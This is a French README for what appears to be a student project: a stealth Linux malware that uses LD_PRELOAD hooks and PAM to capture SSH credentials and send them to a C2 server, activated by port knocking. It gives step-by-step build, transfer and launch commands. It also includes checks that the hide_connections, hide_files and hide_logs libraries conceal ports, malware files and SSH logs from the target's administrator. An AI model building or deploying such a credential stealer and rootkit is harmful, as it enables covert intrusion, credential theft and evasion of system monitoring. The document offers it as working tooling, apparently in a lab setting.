 # Malika MECHKAL 3SI2

🛠️ README : Malware avec LD_PRELOAD & Port Knocking

📌 Introduction
Ce projet implémente un malware furtif exploitant LD_PRELOAD et PAM (Pluggable Authentication Modules) pour capturer les identifiants SSH et masquer sa présence sur la machine cible.

Le malware est activé via un mécanisme de Port Knocking nécessitant une séquence secrète de frappes sur les ports 1111, 2222 et 3333. Une fois activé, il intercepte les connexions SSH, récupère les identifiants et établit une connexion ssh automatique avec un serveur C2.

🔹 Fonctionnalités
    Port Knocking : Activation secrète du malware en écoutant sur 3 ports.
    Interception des identifiants SSH avec PAM.
    Masquage des connexions réseau via hide_connections.so.
    Masquage des fichiers malveillants via hide_files.so.
    Suppression et blocage des logs via hide_logs.so.
    Connexion ssh automatique sur la cible depuis serveur C2 après interception des identifiants.

📂 Installation & Exécution
#  1- Configuration des IPs
Avant de compiler, assurez-vous de configurer les IP correctes dans les fichiers malware.c et server.c :

```
#define C2_IP "192.168.18.128"  // IP du serveur C2
#define TARGET_IP SI"192.168.18.130"  // IP de la machine cible

```

# 2- Compilation du projet
Sur la machine serveur C2, utilisez make pour compiler tous les fichiers 

```
make 

```
Cela génère les exécutables suivants :
*   server
*   port_knock
*   malware.so
*   hide_connections.so
*   hide_files.so
*   hide_logs.so

# 3-  Transfert des fichiers vers la machine cible
Transférez les fichiers générés (sauf server) vers /tmp/ sur la machine cible :

```
scp port_knock malware.so hide_connections.so hide_files.so hide_logs.so user@192.168.18.130:/tmp

```
# 4-  Préparation de la machine cible
Sur la machine cible, désactivez SSH et préparez l’environnement :

```
sudo systemctl stop ssh
sudo mkdir -p /run/sshd
sudo chmod 755 /run/sshd

```

# 5- Lancement du Port Knocking
Sur la machine cible, exécutez port_knock en mode root dans le dossier /tmp:

```
sudo ./port_knock
```

# 6- Lancement du serveur C2
Sur la machine serveur C2 :

```
./server

```
Le serveur attend la frappe secrète des ports pour activer le malware.

# 7- Activation automatique du malware
Lorsque le C2 envoie des paquets aux ports 1111, 2222 et 3333, la machine cible détecte la séquence et démarre le malware avec LD_PRELOAD(malware.so).

# 8- Connexion SSH automatique & interception
*   Après activation, la machine cible attend une connexion SSH.
*   Lorsqu’un utilisateur se connecte en SSH, les identifiants sont interceptés et envoyés au serveur C2.
*   Le serveur C2 utilise ces identifiants pour se connecter automatiquement à la machine cible.
*   Un fichier credentials.log est créé à la racine du serveur avec les identifiants capturés.

# 9- Tests & Vérifications
Masquer les connexions réseau
Sur la machine cible, exécutez :

```
sudo LD_PRELOAD=/tmp/hide_connections.so netstat -tulnp

```
    => Les ports 1111, 2222 et 3333 doivent être invisibles.

# 10- Masquer les fichiers malveillants
Sur la machine cible, exécutez :

```
sudo LD_PRELOAD=/tmp/hide_files.so ls -la /tmp

```
    => Les fichiers du malware (malware.so, hide_*.so) ne doivent pas apparaître.

# 11- Masquer les logs
Sur la machine cible, exécutez :

```
sudo LD_PRELOAD=/tmp/hide_logs.so journalctl -xe

```
    => Les logs liés aux connexions SSH ne doivent plus apparaître.

# /!\######## Problème avec la branche DEV_USER_NON_ROOT
Une tentative a été faite pour exécuter port_knock sans être root, mais cela a posé des problèmes de clés SSH.

Même en copiant correctement les clés dans /tmp/ssh, l’authentification ne fonctionnait pas.


